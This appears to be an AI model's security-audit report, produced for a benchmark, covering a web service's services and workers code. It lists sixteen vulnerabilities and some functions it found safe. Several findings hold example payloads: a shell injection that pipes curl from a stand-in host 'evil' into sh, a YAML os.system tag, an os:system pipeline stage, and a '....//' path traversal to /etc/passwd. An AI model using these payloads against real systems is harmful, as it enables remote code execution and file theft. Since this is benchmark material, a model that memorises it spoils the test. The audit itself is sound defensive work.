# Sonnet 5 — region `services` (services/ + workers/) — verbatim report

Blind copy of 3ff7e43. Prompt: benchmarks/sweep_prompt.md v1, region `services`.

---

1. **Shell injection — services/retention.py:purge, via workers/tasks.py:cleanup_dataset.** POST /api/datasets/<id>/schedule_cleanup takes `pattern` from the JSON body; POST /api/datasets takes `cleanup_dir` from the body. Both stored/queued unsanitized. enqueue("cleanup_dataset") -> runner -> tasks.py:cleanup_dataset -> retention.py:purge -> `subprocess.Popen(f"rm -f {cleanup_dir}/{pattern}", shell=True)`. Neither value quoted. Gains: arbitrary shell as the worker, e.g. `pattern="*.tmp; curl http://evil/x|sh #"`.

2. **Shell injection — workers/tasks.py:_inspect_async.** POST /api/datasets with crafted `name` plus `source_url`. import_dataset -> _inspect_async(ds.name, out_path) -> `cmd = f"file '{path}' | grep -q . && echo inspected {dataset_name}"` via Popen(shell=True). dataset_name interpolated with no quoting. Secondary: `fname` derived from source_url tail is single-quoted but not escaped, so a source_url path containing `'` also breaks out; is_safe_url validates only the hostname.

3. **SSRF — workers/tasks.py:import_dataset / _notify.** POST /api/datasets with `webhook_url` to an internal address plus a source_url. ds.webhook_url stored with no validation, then _notify(ds.webhook_url, ...) -> requests.post(url, json=body). Unlike the dataset download (fetcher.py:fetch, gated by is_safe_url), this POST has zero host validation. Full SSRF to cloud metadata.

4. **Unmoderated feedback poisons the live model — workers/tasks.py:retrain_model.** POST /api/datasets/<id>/feedback (any authenticated user, no ownership check tying caller to model) enqueues retrain_model. retrain_model pulls `Feedback.query.filter_by(model_id=model.id).all()` with NO status="approved" filter and folds every row into scorer.apply_feedback. The sibling retrain_from_queue correctly filters status="approved", showing the gate exists but this handler bypasses it and is the one wired to the public endpoint.

5. **SQL injection — services/experiments.py:search_experiments, tag/sort.** GET /api/experiments/search. `name` is escaped via escape_sql, but `tag` is concatenated raw: `where.append(f"tags LIKE '%{tag}%'")` one line below the escaped name. `sort` is interpolated directly into `ORDER BY {sort} DESC` with no allow-list.

6. **SQL injection — services/experiments.py:count_by_owner.** GET /api/experiments/count?owner=... `owner = owner or "0"` then `f"SELECT COUNT(*) FROM experiments WHERE owner_id = {owner}"` — no cast to int, no binding, despite the docstring's claim it is "numeric".

7. **LLM-authored SQL executed directly — services/experiments.py:ask_experiments.** POST /api/experiments/ask. generate_sql(question)'s output is run verbatim: db.session.execute(text(sql)). The safe counterpart ask_experiments_structured (bound parameter, allow-listed column) sits right next to it.

8. **Unsafe YAML deserialization (RCE) — services/config_loader.py:load_pipeline_config.** POST /api/experiments with pipeline_config. create_experiment -> load_pipeline_config -> `yaml.load(text, Loader=yaml.Loader)`. Tags like `!!python/object/apply:os.system ["id"]` execute at parse time.

9. **Arbitrary module import + call (RCE) — services/pipeline.py:_resolve / run_pipeline.** POST /api/experiments/<id>/run with a `stages` array (also no ownership check). Any `op` containing ":" is split into module:attr, importlib.import_module, getattr, then called with attacker args. `{"stages":[{"op":"os:system","args":["id"]}]}` is RCE. Also reachable indirectly: stages persisted from finding #8's YAML are replayed when `stages` is omitted.

10. **Jinja2 SSTI — services/reports.py:render_report.** POST /api/reports/preview (template), POST /api/models/<id>/report (template), and a stored two-step path POST /api/models/<id>/annotate (note, cached) -> GET /api/models/<id>/annotation/render. `Environment(autoescape=True).from_string(template_src).render(**context)` — template_src is raw attacker text. autoescape only escapes output, not template syntax.

11. **Path traversal / arbitrary file read — services/reports.py:load_template_file / render_custom_report.** POST /api/reports/custom with template_name. `os.path.join(str(TEMPLATE_DIR), template_name)` with no containment check; sanitize_path is not called here, unlike the registry functions. An absolute path is honored outright, discarding TEMPLATE_DIR. Contents are then rendered as a template and returned.

12. **Reflected/stored XSS — services/reports.py:render_page.** POST /api/reports/preview with `body` supplied directly and title=model.name. `_page_env = Environment(autoescape=False)`; title/body_html interpolated verbatim into the HTML shell and returned as text/html. The endpoint's purpose is a shareable link, so an attacker crafts a report containing <script> and shares it.

13. **Arbitrary file write, no containment — services/registry.py:save_with_metadata.** POST /api/models with artifact_b64 and meta.storage_path. `rel = meta.get("storage_path")`; `target = os.path.join(str(ARTIFACT_DIR), rel)` — no sanitize_path, no realpath check (contrast download_artifact in the same file). An absolute storage_path discards ARTIFACT_DIR entirely; os.makedirs will create missing directories. Attacker bytes to an attacker-chosen absolute path. Contradicts the module docstring's claim that reads/writes go through sanitize_path.

14. **sanitize_path bypass by doubling — affects store_artifact/read_artifact (registry.py) and raw_artifact (api/models.py) when strict mode is on.** core/security.py:sanitize_path does a single non-overlapping pass: `name.replace("../","").replace("..\\","")`. `"....//....//....//etc/passwd"` has its embedded "../" stripped once but the survivors recombine into a fresh "../". Backs both the write path (store_artifact, from POST /api/models `name`) and the read path (read_artifact, from GET /api/models/blob?name=). Separately, GET /api/models/artifact?path=... (api/models.py:raw_artifact) only calls sanitize_path when the runtime setting security.strict_paths is true, and that DEFAULTS TO FALSE — so by default registry.read_raw gets a completely unsanitized path: full arbitrary file read with no bypass needed.

15. **Mass assignment — services/config_loader.py:apply_updates.** PATCH /api/models/<model_id>, gated only by model.owner_id == g.user_id. `setattr(obj, key, value)` for every key in the raw JSON body, no field allow-list. The owner can overwrite artifact_path, meta_json, or owner_id, bypassing the intended write path. Combined with #14, an owner can steer artifact_path and pull whatever read_artifact resolves it to.

16. **Unsandboxed exec of LLM-generated code — services/analysis.py:run_analysis.** POST /api/datasets/<id>/analyze with question. generate_code(question) returns a snippet run with `exec(code, scope)` where scope = {"df": df, "result": None}. A single-dict-arg exec() uses that dict as both globals and locals and Python auto-injects __builtins__ into it, so the "scoped to df" claim does not hold — the code has __import__, open, etc. The safe counterpart run_analysis_aggregate sits right below it.

### INSPECTED AND BELIEVED SAFE

- **registry.py:download_artifact** — resolves both ARTIFACT_DIR and the joined target with realpath and rejects anything not under root + os.sep. Blocks traversal and absolute-path escapes, unlike save_with_metadata/sanitize_path elsewhere in the same file.
- **experiments.py:search_by_tag** — bound parameter; no injection.
- **experiments.py:ask_experiments_structured** — regex-anchored to column=value, allow-lists the column, binds the value. No model-authored SQL executed.
- **analysis.py:run_analysis_aggregate** — fixed keyword-to-lambda dispatch (_SAFE_OPS), no code execution, no SQL.
- **markdown.py:render_card_markdown** — HTML-escapes every interpolated value, restricts image src to same-origin prefixes with no "://", and href to http(s)/same-origin/# via _ALLOWED_LINK_RE; blocks javascript:/data: and attribute breakout. (Its sibling render_markdown, which emits src/href unescaped, is used per its docstring only for badges/diagrams and I found no caller passing fully untrusted input within my region — worth a look by whichever region owns its callers, since it is not itself safe against a malicious href/src.)
- **config_loader.py:load_document** — yaml.safe_load; correctly avoids load_pipeline_config's issue.
- **fetcher.py:fetch_external** — resolves the hostname and rejects private/loopback/link-local/reserved ranges before requesting, redirects disabled. Note it is unused by the workers/ code, which uses the weaker but allow-list-gated fetch.
- **workers/queue.py / workers/runner.py** — enqueue/claim/dispatch mechanics (status transitions, rollback-on-failure) look correct; the bugs are in what specific handlers do with payloads.
- **reports.py BUILTIN_KINDS dispatch in render_builtin_report** — kind is looked up in a fixed dict with .get(kind, "summary.tpl"), so it cannot be used for traversal (contrast render_custom_report, #11).
